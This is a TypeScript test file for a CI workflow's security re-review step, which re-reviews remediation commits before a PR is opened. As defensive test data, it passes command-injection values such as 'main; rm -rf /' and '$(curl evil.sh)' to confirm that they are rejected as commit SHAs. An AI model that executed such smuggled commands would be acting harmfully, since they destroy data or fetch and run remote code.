import { describe, expect, test } from "bun:test";
import { readFileSync } from "fs";
import { join } from "path";

import { assertMarkedBlockReachable } from "../lib/reachability";
import {
  reviewIsCurrent,
  rookGateVerdict,
  rookReviewSha,
  rookScopeCommand,
} from "../lib/security-verdict";

/**
 * #171 — a remediation commit no longer ends the run.
 *
 * #169 made a stale security review a refusal and recorded the gap it left in
 * specs/HARNESS-STANDARD.md in as many words: "the refusal stops the run; it
 * does not re-review the new tip." Every run that needed a Verify regression
 * round therefore died at the security decision, because the regression loop
 * commits upstream of it. ship.js now spawns a second rook pinned to the
 * remediation commit and continues to the PR step on its PASS.
 *
 * ship.js is not importable — the Workflow sandbox has no module loading
 * (#69) — so the decision is EXECUTED here rather than grepped for: the
 * marker-delimited block is extracted and run over planted state with stub
 * agents, the way test/security-verdict-blocks.test.ts drives the blocks it
 * owns. Nothing in this file reads a run status.
 *
 * SHIP_SOURCE exists for test/suite-binding-mutation.test.ts, which runs this
 * file twice over one planted input — once against workflows/ship.js and once
 * against a mutant copy whose re-review spawn is short-circuited — and watches
 * the mutant ship what the real source refuses.
 */

const REPO_ROOT = join(import.meta.dir, "..");
const SHIP_PATH = process.env.SHIP_SOURCE || join(REPO_ROOT, "workflows", "ship.js");
const shipSource = readFileSync(SHIP_PATH, "utf-8");

const REREVIEW_START = "// ──── SECURITY-REREVIEW-START ────";
const REREVIEW_END = "// ──── SECURITY-REREVIEW-END ────";
const DECISION_START = "// ──── SECURITY-DECISION-START ────";
const DECISION_END = "// ──── SECURITY-DECISION-END ────";
const SECURITY_START = "// ──── ROOK-SECURITY-START ────";
const SECURITY_END = "// ──── ROOK-SECURITY-END ────";
const CURRENCY_START = "// ──── REVIEW-CURRENCY-START ────";
const CURRENCY_END = "// ──── REVIEW-CURRENCY-END ────";

/**
 * Slice one marked region, refusing anything but exactly one pair.
 *
 * Called at module scope below, so a renamed marker or a second copy of the
 * block ABORTS THIS FILE rather than skipping a case. A duplicate is the
 * nastier of the two: `indexOf` would happily slice the dead copy while the
 * live one went unchecked, which is the #200 shape
 * .claude/rules/checks-must-be-able-to-fail.md names.
 */
function sliceBlock(startMarker: string, endMarker: string): string {
  const starts = shipSource.split(startMarker).length - 1;
  const ends = shipSource.split(endMarker).length - 1;
  if (starts !== 1 || ends !== 1) {
    throw new Error(
      `could not slice ${startMarker}: the start marker appears ${starts} times and the end ` +
        `marker ${ends} times, expected exactly 1 of each. Either the block was renamed, or a ` +
        `second copy exists and this file would be testing whichever one came first.`,
    );
  }
  const start = shipSource.indexOf(startMarker);
  const end = shipSource.indexOf(endMarker);
  if (end < start) {
    throw new Error(`could not slice ${startMarker}: the end marker comes first`);
  }
  return shipSource.slice(start + startMarker.length, end);
}

/** Module scope on purpose — see sliceBlock's note. */
const REREVIEW_BLOCK = sliceBlock(REREVIEW_START, REREVIEW_END);
const DECISION_BLOCK = sliceBlock(DECISION_START, DECISION_END);

/** The inlined copies ship.js actually runs, extracted rather than imported. */
const inlined = (() => {
  const securityBlock = sliceBlock(SECURITY_START, SECURITY_END);
  const currencyBlock = sliceBlock(CURRENCY_START, CURRENCY_END);
  const body = securityBlock.includes(currencyBlock)
    ? securityBlock
    : `${securityBlock}\n${currencyBlock}`;
  const out = new Function(
    `${body}\nreturn { rookReviewSha, rookScopeCommand, rookGateVerdict, reviewIsCurrent }`,
  )() as {
    rookReviewSha: typeof rookReviewSha;
    rookScopeCommand: typeof rookScopeCommand;
    rookGateVerdict: typeof rookGateVerdict;
    reviewIsCurrent: typeof reviewIsCurrent;
  };
  for (const [name, fn] of Object.entries(out)) {
    if (typeof fn !== "function") {
      throw new Error(
        `ship.js's inlined ${name} is not a function — the agreement matrix below would ` +
          `be comparing nothing`,
      );
    }
  }
  return out;
})();

/** ship.js's own shellQuote, extracted rather than reimplemented. */
const shellQuote: (word: unknown) => string = (() => {
  const match = shipSource.match(/function shellQuote\(word\) \{[\s\S]*?\n\}/);
  if (!match) {
    throw new Error("ship.js no longer defines shellQuote(word) — this harness extracts it by name");
  }
  return new Function(`${match[0]}\nreturn shellQuote`)();
})();

/** The commit the first review read. */
const REVIEWED = "3fe336f1a2b3c4d5e6f708192a3b4c5d6e7f8091";
/** The remediation commit the Verify regression round pushed on top of it. */
const REMEDIATION = "ef998b73c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f";
/** A third commit, for the branch that keeps moving. */
const THIRD = "a1b2c3d4e5f60718293a4b5c6d7e8f9001122334";
const FOURTH = "b2c3d4e5f60718293a4b5c6d7e8f900112233445";

const GOOD_SCOPE = { exitCode: 0, files: ["lib/a.ts", "workflows/ship.js"] };

interface Spawn {
  label: string;
  prompt: string;
}

interface RunOpts {
  /** What the second rook returns, per round. The last entry repeats. */
  rook?: Array<Record<string, unknown>>;
  /** What the scope step returns, per round. The last entry repeats. */
  scope?: Array<unknown>;
  /** Heads reported by the record step after each round. The last repeats. */
  headsAfter?: string[];
  /** Whether the record step's receipt says it wrote the state. */
  recordOk?: boolean;
  tested?: unknown;
  head?: unknown;
  securityVerdict?: { spawned: boolean; verdict: string; failures: string[] };
}

/**
 * Execute the re-review block and then the decision block, in one sandbox.
 *
 * Both, not just the first: "continue to the PR step on its PASS" is a claim
 * about what the decision block does afterwards, and the re-review's only way
 * through it is to make the review genuinely current. Running the re-review
 * alone would prove it returns undefined, which the old stale refusal would
 * also have done if someone deleted it.
 *
 * `with` over a Proxy rather than a parameter list, for the reason
 * test/security-verdict-blocks.test.ts gives: which module-scope names the
 * blocks read is an implementation detail that moves, and a `const` in the
 * block would collide with a parameter of the same name.
 */
async function runRereview(opts: RunOpts = {}) {
  const spawns: Spawn[] = [];
  const logs: string[] = [];
  const rook = opts.rook ?? [{ result: "PASS" }];
  const scope = opts.scope ?? [GOOD_SCOPE];
  const heads = opts.headsAfter ?? [];
  const at = <T>(list: T[], round: number): T | undefined =>
    list.length === 0 ? undefined : list[Math.min(round - 1, list.length - 1)];
  const roundOf = (label: string) => Number(label.slice(label.lastIndexOf("-") + 1)) || 1;

  const scopeObject: Record<string, unknown> = {
    log: (m: unknown) => logs.push(String(m)),
    timedAgent: async (prompt: string, o: { label: string }) => {
      spawns.push({ label: o.label, prompt });
      if (o.label.startsWith("rook-scope-rereview-")) return at(scope, roundOf(o.label));
      if (o.label.startsWith("record-security-rereview-")) {
        return {
          ok: opts.recordOk ?? true,
          headSha: at(heads, roundOf(o.label)) ?? "",
          error: opts.recordOk === false ? "exit 1" : undefined,
        };
      }
      return { ok: true };
    },
    briefedAgent: async (prompt: string, o: { label: string }) => {
      spawns.push({ label: o.label, prompt });
      return at(rook, roundOf(o.label));
    },
    rookReviewSha: inlined.rookReviewSha,
    rookScopeCommand: inlined.rookScopeCommand,
    rookGateVerdict: inlined.rookGateVerdict,
    reviewIsCurrent: inlined.reviewIsCurrent,
    shellQuote,
    securityVerdict: opts.securityVerdict ?? {
      spawned: true,
      verdict: "PASS",
      failures: [] as string[],
    },
    testedSha: "tested" in opts ? opts.tested : REVIEWED,
    headSha: "head" in opts ? opts.head : REMEDIATION,
    verifyResult: { result: "PASS" },
    PROJECT_ROOT: "/p",
    HARNESS_ROOT: "/h",
    WORK_DIR: "/w",
    commitDir: "/p",
    ISSUE: 171,
    SLUG: "pai-harness-171",
    shipBranch: "171-rereview",
    GATE_RESULT_SCHEMA: {},
  };

  const sandbox = new Proxy(scopeObject, {
    has: () => true,
    get: (target, key) => {
      if (key === Symbol.unscopables) return undefined;
      return key in target
        ? target[key as string]
        : (globalThis as unknown as Record<string, unknown>)[key as string];
    },
  });

  const factory = new Function(
    "__scope__",
    `return (async function () { with (__scope__) {\n${REREVIEW_BLOCK}\n${DECISION_BLOCK}\nreturn undefined\n} })()`,
  );
  const out = (await factory(sandbox)) as Record<string, unknown> | undefined;
  return {
    out,
    logs,
    spawns,
    labels: spawns.map(s => s.label),
    state: scopeObject,
  };
}

const reviewSpawns = (labels: string[]) => labels.filter(l => l.startsWith("rook-rereview-"));

// ── AC-1: the second rook, and the PR step beyond it ───────────────────────

describe("#171 AC-1: a remediation commit is re-reviewed instead of ending the run", () => {
  test("remediate-then-ship: a passing second review reaches the PR step", async () => {
    const run = await runRereview({ rook: [{ result: "PASS" }] });

    // Printed for test/suite-binding-mutation.test.ts, which runs this exact
    // case against a mutant ship.js and reads the two numbers rather than
    // inferring them from an exit code.
    console.log(`REREVIEW-SPAWNED: ${reviewSpawns(run.labels).length}`);
    console.log(`REREVIEW-OUTCOME: ${run.out?.status ?? "PROCEEDED"}`);

    expect(
      reviewSpawns(run.labels).length,
      `no second rook was spawned; the steps that ran were ${JSON.stringify(run.labels)}`,
    ).toBe(1);
    expect(
      run.out,
      `a remediation commit that passed a second review still ended the run: ${JSON.stringify(run.out)}`,
    ).toBeUndefined();
    expect(
      run.logs.some(l => /Security review PASSED, and is current at/.test(l)),
      `the decision block never accepted the re-reviewed commit: ${JSON.stringify(run.logs)}`,
    ).toBe(true);
  });

  test("the re-reviewed commit is what the decision block then compares", async () => {
    const run = await runRereview({ rook: [{ result: "PASS" }] });
    expect(run.state.testedSha, "testedSha was not advanced to the remediation commit").toBe(
      REMEDIATION,
    );
    expect(run.logs.join("\n")).toContain(REMEDIATION);
  });

  test("remediate-then-ship: a second review that finds something refuses the run", async () => {
    const run = await runRereview({
      rook: [{ result: "FAIL", failures: ["command injection in the remediation commit"] }],
    });

    console.log(`REREVIEW-SPAWNED: ${reviewSpawns(run.labels).length}`);
    console.log(`REREVIEW-OUTCOME: ${run.out?.status ?? "PROCEEDED"}`);

    expect(
      run.out?.status,
      `the remediation commit's own finding did not stop the run: ${JSON.stringify(run.out)}`,
    ).toBe("SHIP_FAILED");
    expect(String(run.out?.reason)).toContain("command injection in the remediation commit");
    expect((run.out?.security as Record<string, unknown>)?.verdict).toBe("FAIL");
    expect(run.out?.issue).toBe(171);
  });

  test("a review that is already current spawns nothing", async () => {
    // The positive control. A block that re-reviews every run is switched on
    // rather than correct, and costs a rook on every ship.
    const run = await runRereview({ tested: REVIEWED, head: REVIEWED });
    expect(reviewSpawns(run.labels), "a current review was re-reviewed anyway").toEqual([]);
    expect(run.out).toBeUndefined();
  });

  test("a first review that FAILED is not re-reviewed into a pass", async () => {
    const run = await runRereview({
      securityVerdict: { spawned: true, verdict: "FAIL", failures: ["a reproduced guard bypass"] },
      rook: [{ result: "PASS" }],
    });
    expect(reviewSpawns(run.labels), "a FAIL verdict was re-reviewed away").toEqual([]);
    expect(run.out?.status).toBe("SHIP_FAILED");
    expect(String(run.out?.reason)).toContain("a reproduced guard bypass");
  });

  test("the re-review happens before the PR step, in the file", async () => {
    // Structural, because the PR step is hundreds of lines further down and
    // cannot be stubbed into the extracted block: the execution above proves
    // the block falls through, and this proves what it falls through to.
    const rereview = shipSource.indexOf(REREVIEW_END);
    const decision = shipSource.indexOf(DECISION_END);
    const prStep = shipSource.indexOf("record-env-and-pr");
    expect(prStep, "the PR step label moved — this guard no longer checks anything").toBeGreaterThan(
      -1,
    );
    expect(rereview).toBeLessThan(decision);
    expect(decision, "the re-review now happens after the PR is opened").toBeLessThan(prStep);
  });

  test("the re-review block is reachable — module top level, not inside a conditional", () => {
    // Everything above this point is blind to whether the block RUNS: wrapping
    // the marked region in `if (false)` leaves the slice byte-identical and the
    // offsets in the same order (#201).
    expect(assertMarkedBlockReachable(shipSource, "SECURITY-REREVIEW")).toEqual(["Program"]);
  });
});

// ── AC-2: the scope of the second review ───────────────────────────────────

describe("#171 AC-2: the second review is scoped to the remediation delta", () => {
  test("the scope command passes the reviewed commit as --base and the new one as --sha", async () => {
    const run = await runRereview({ rook: [{ result: "PASS" }] });
    const scopeStep = run.spawns.find(s => s.label.startsWith("rook-scope-rereview-"));
    expect(scopeStep, `no scope step ran; steps were ${JSON.stringify(run.labels)}`).toBeDefined();

    const prompt = scopeStep!.prompt;
    expect(prompt, "the second review's scope is not pinned to the remediation commit").toContain(
      `--sha ${REMEDIATION}`,
    );
    expect(
      prompt,
      "the second review re-reads the whole branch instead of the remediation delta",
    ).toContain(`--base ${REVIEWED}`);
    expect(prompt).toContain("/h/scripts/rook-review-scope.ts");
    expect(prompt).toContain("rook-rereview-1-scope.json");
  });

  test("the scope command is ship.js's own, with the base appended to it", () => {
    // Built from the inlined rookScopeCommand rather than hand-assembled, so
    // the quoting the library decided on still applies. A `--base` bolted onto
    // a string this test wrote would prove nothing about ship.js.
    const base = inlined.rookScopeCommand("/p", "/h", REMEDIATION, "/w/s.json");
    expect(base).toContain(`--sha ${REMEDIATION}`);
    expect(base).toContain(`--project ${shellQuote("/p")}`);
    expect(REREVIEW_BLOCK, "the re-review builds its own command instead of reusing the helper")
      .toContain("rookScopeCommand(PROJECT_ROOT, HARNESS_ROOT, sha, scopePath)");
    expect(REREVIEW_BLOCK).toContain("--base ${base}");
  });

  test("the reviewer prompt names the remediation commit and the commit already reviewed", async () => {
    const run = await runRereview({ rook: [{ result: "PASS" }] });
    const rookStep = run.spawns.find(s => s.label.startsWith("rook-rereview-"));
    expect(rookStep, `no second rook ran; steps were ${JSON.stringify(run.labels)}`).toBeDefined();

    const prompt = rookStep!.prompt;
    expect(prompt, "the reviewer is not told which commit it is reviewing").toContain(
      `at commit ${REMEDIATION}`,
    );
    expect(prompt, "the reviewer is not told what was already reviewed").toContain(REVIEWED);
    expect(prompt, "the reviewer is still scoped to a worktree HEAD").not.toContain(
      "origin/main...HEAD",
    );
    expect(prompt).toContain("rook-rereview-1-scope.json");
    expect(prompt).toContain("rook-rereview-1-findings.json");
  });

  test("the second review writes its own scope and findings files", async () => {
    // Reusing the first review's paths would let the recorder read the first
    // review's findings back and call them the second review's.
    const run = await runRereview({ rook: [{ result: "PASS" }] });
    const record = run.spawns.find(s => s.label.startsWith("record-security-rereview-"));
    expect(record).toBeDefined();
    expect(record!.prompt).toContain(shellQuote("/w/rook-rereview-1-scope.json"));
    expect(record!.prompt).toContain(shellQuote("/w/rook-rereview-1-findings.json"));
    expect(
      record!.prompt,
      "the second review is recorded against the first review's scope file",
    ).not.toContain(shellQuote("/w/rook-scope.json"));
  });

  test("a second review that could not establish a scope blocks the run", async () => {
    // rookGateVerdict's contract, exercised through the re-review: "found no
    // problems in nothing" must not read as "found no problems".
    const run = await runRereview({
      scope: [{ exitCode: 0, files: [] }],
      rook: [{ result: "PASS" }],
    });
    expect(run.out?.status, "a PASS over zero files shipped").toBe("SHIP_FAILED");
    expect(String(run.out?.reason)).toMatch(/empty/i);
  });

  test("a re-review that cannot be pinned falls through to the staleness refusal", async () => {
    for (const bad of ["", "HEAD", "main", undefined, null]) {
      const run = await runRereview({ tested: bad, rook: [{ result: "PASS" }] });
      expect(reviewSpawns(run.labels), `${JSON.stringify(bad)} was re-reviewed anyway`).toEqual([]);
      expect(run.out?.status, `${JSON.stringify(bad)} reached the PR step`).toBe("SHIP_FAILED");
      expect(String(run.out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    }
  });
});

// ── AC-3: the cap, and what exhausting it does ─────────────────────────────

describe("#171 AC-3: exhausting the round cap refuses the run", () => {
  /** A branch that moves again after every re-review. */
  const movingBranch = () => ({
    rook: [{ result: "PASS" }],
    headsAfter: [THIRD, FOURTH],
  });

  test("the cap is exhausted, not looped forever", async () => {
    const run = await runRereview(movingBranch());
    expect(
      reviewSpawns(run.labels).length,
      `the re-review loop ran ${reviewSpawns(run.labels).length} times against a fixed cap`,
    ).toBe(2);
  });

  test("exhaustion returns SHIP_FAILED with reason SECURITY_REREVIEW_EXHAUSTED", async () => {
    const run = await runRereview(movingBranch());
    expect(run.out?.status, "an exhausted cap reached the PR step").toBe("SHIP_FAILED");
    expect(String(run.out?.reason)).toStartWith("SECURITY_REREVIEW_EXHAUSTED");
    expect((run.out?.security as Record<string, unknown>)?.verdict).toBe("FAIL");
    expect(run.out?.issue).toBe(171);
    expect(run.out?.slug).toBe("pai-harness-171");
  });

  test("the recorder is handed the exhausted state before the run returns", async () => {
    const run = await runRereview(movingBranch());
    const idx = run.labels.indexOf("record-security-exhausted");
    expect(
      idx,
      `the exhausted state was never recorded; steps were ${JSON.stringify(run.labels)}`,
    ).toBeGreaterThan(-1);

    const prompt = run.spawns[idx].prompt;
    expect(prompt).toContain("record-security-verdict.ts");
    expect(prompt, "the artefact would still say the branch passed a review").toContain(
      "--verdict FAIL",
    );
    // The last round's files, so the record names what was last looked at
    // rather than the first review's scope.
    expect(prompt).toContain(shellQuote("/w/rook-rereview-2-scope.json"));
  });

  test("an exhausted verdict is never a log line the run continues past", async () => {
    const run = await runRereview(movingBranch());
    expect(run.logs.some(l => /SECURITY BLOCK: SECURITY_REREVIEW_EXHAUSTED/.test(l))).toBe(true);
    // Logged AND returned. #129 was a verdict that was only ever logged.
    expect(run.out?.status).toBe("SHIP_FAILED");

    // Structural: both refusal paths in the block end in the same return, and
    // neither is guarded by a ternary on the verdict that would turn it into a
    // warning (SC-584's shape, one block over).
    expect(REREVIEW_BLOCK).toContain("SECURITY_REREVIEW_EXHAUSTED");
    expect((REREVIEW_BLOCK.match(/status: 'SHIP_FAILED'/g) || []).length).toBe(2);
    expect(REREVIEW_BLOCK).not.toMatch(/verdict === 'PASS' \?/);
    expect(REREVIEW_BLOCK, "the re-review warns instead of refusing").not.toMatch(
      /log\(`?WARN[^`]*(stale|EXHAUSTED)/i,
    );
  });

  test("a recorded round that did not write the state fails the round", async () => {
    // Fail closed. An unrecorded re-review is one the artefact cannot show, so
    // treating it as a pass makes the second review as consequence-free as the
    // first one used to be (#129).
    const run = await runRereview({ rook: [{ result: "PASS" }], recordOk: false });
    expect(run.out?.status, "an unrecorded re-review shipped").toBe("SHIP_FAILED");
    expect(String(run.out?.reason)).toContain("could not be recorded");
  });

  test("the cap is a fixed number in ship.js, not a value an agent reports", () => {
    const declared = REREVIEW_BLOCK.match(/const MAX_SECURITY_REREVIEWS = (\d+)/);
    expect(declared, "the round cap is not a literal in the block").not.toBeNull();
    expect(Number(declared![1])).toBeGreaterThan(0);
    expect(Number(declared![1])).toBeLessThanOrEqual(3);
  });
});

// ── AC-4: the inlined helpers still match the library ──────────────────────

describe("#171 AC-4: every re-review helper agrees with lib/security-verdict.ts", () => {
  const SHA_MATRIX: Array<[string, unknown]> = [
    ["a full SHA", REVIEWED],
    ["an abbreviation", REVIEWED.slice(0, 7)],
    ["uppercase", REVIEWED.toUpperCase()],
    ["padded", ` ${REVIEWED} `],
    ["HEAD", "HEAD"],
    ["a branch name", "main"],
    ["too short", "abc"],
    ["empty", ""],
    ["null", null],
    ["undefined", undefined],
    ["a number", 42],
    ["an object", {}],
    ["a command", "3192a75; rm -rf /"],
  ];

  const CURRENCY_MATRIX: Array<[string, unknown, unknown]> = [
    ["identical", REVIEWED, REVIEWED],
    ["the #164 pair", REVIEWED, REMEDIATION],
    ["head abbreviates tested", REVIEWED, REVIEWED.slice(0, 7)],
    ["tested abbreviates head", REVIEWED.slice(0, 7), REVIEWED],
    ["tested missing", "", REMEDIATION],
    ["head missing", REVIEWED, ""],
    ["both missing", undefined, null],
    ["both nonsense", "HEAD", "main"],
  ];

  const VERDICT_MATRIX: Array<[string, unknown, unknown]> = [
    ["a clean review", GOOD_SCOPE, { result: "PASS" }],
    ["a finding", GOOD_SCOPE, { result: "FAIL", failures: ["x"] }],
    ["a FAIL with no findings", GOOD_SCOPE, { result: "FAIL", failures: [] }],
    ["an empty scope", { exitCode: 0, files: [] }, { result: "PASS" }],
    ["a blank-path scope", { exitCode: 0, files: ["", "  "] }, { result: "PASS" }],
    ["a refused scope", { exitCode: 1, files: [] }, { result: "PASS" }],
    ["no scope at all", null, { result: "PASS" }],
    ["no reviewer", GOOD_SCOPE, null],
    ["an unrecognised verdict", GOOD_SCOPE, { result: "MAYBE" }],
  ];

  for (const [label, value] of SHA_MATRIX) {
    test(`rookReviewSha agrees on ${label}`, () => {
      expect(inlined.rookReviewSha(value), `drift at ${label}`).toEqual(rookReviewSha(value));
    });
  }

  for (const [label, tested, head] of CURRENCY_MATRIX) {
    test(`reviewIsCurrent agrees on ${label}`, () => {
      expect(inlined.reviewIsCurrent(tested, head), `drift at ${label}`).toEqual(
        reviewIsCurrent(tested, head),
      );
      // Word for word: a copy that refuses the same inputs with a different
      // explanation is still drift, and that one reaches an operator.
      expect(inlined.reviewIsCurrent(tested, head).reason).toBe(
        reviewIsCurrent(tested, head).reason,
      );
    });
  }

  for (const [label, scope, rook] of VERDICT_MATRIX) {
    test(`rookGateVerdict agrees on ${label}`, () => {
      expect(inlined.rookGateVerdict(scope, rook), `drift at ${label}`).toEqual(
        rookGateVerdict(scope, rook),
      );
    });
  }

  test("rookScopeCommand agrees, including on the paths that need quoting", () => {
    for (const root of ["/p", "/My Projects/p", "/p'q"]) {
      expect(inlined.rookScopeCommand(root, "/h", REMEDIATION, "/w/s.json")).toBe(
        rookScopeCommand(root, "/h", REMEDIATION, "/w/s.json"),
      );
    }
    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)"]) {
      expect(() => inlined.rookScopeCommand("/p", "/h", bad, "/w/s.json")).toThrow(
        /not a commit SHA/i,
      );
      expect(() => rookScopeCommand("/p", "/h", bad, "/w/s.json")).toThrow(/not a commit SHA/i);
    }
  });

  test("the re-review calls no security helper the library does not export", () => {
    // AC-4's "every". A new inlined `rookSomething` used only by the re-review
    // would have no counterpart to be compared against, and the matrices above
    // would go on passing while the uncompared one drifted — which is exactly
    // how computeACHash's extracted copy came to differ from the inlined one.
    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
    const exported = new Set(
      [...lib.matchAll(/export function ([A-Za-z0-9_]+)/g)].map(m => m[1]),
    );
    expect(exported.size, "lib/security-verdict.ts exports nothing").toBeGreaterThan(0);

    const called = new Set(
      [...REREVIEW_BLOCK.matchAll(/\b((?:rook|review)[A-Za-z0-9_]*)\s*\(/g)].map(m => m[1]),
    );
    expect(called.size, "the re-review block calls no security helper at all").toBeGreaterThan(0);
    for (const name of called) {
      expect(
        exported.has(name),
        `the re-review calls ${name}(), which lib/security-verdict.ts does not export — ` +
          `nothing compares it against anything`,
      ).toBe(true);
    }
  });

  test("the library still exports each of the four exactly once", () => {
    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
    for (const name of ["rookReviewSha", "rookScopeCommand", "rookGateVerdict", "reviewIsCurrent"]) {
      expect(
        (lib.match(new RegExp(`export function ${name}\\b`, "g")) || []).length,
        `lib/security-verdict.ts does not export ${name} exactly once`,
      ).toBe(1);
    }
  });
});
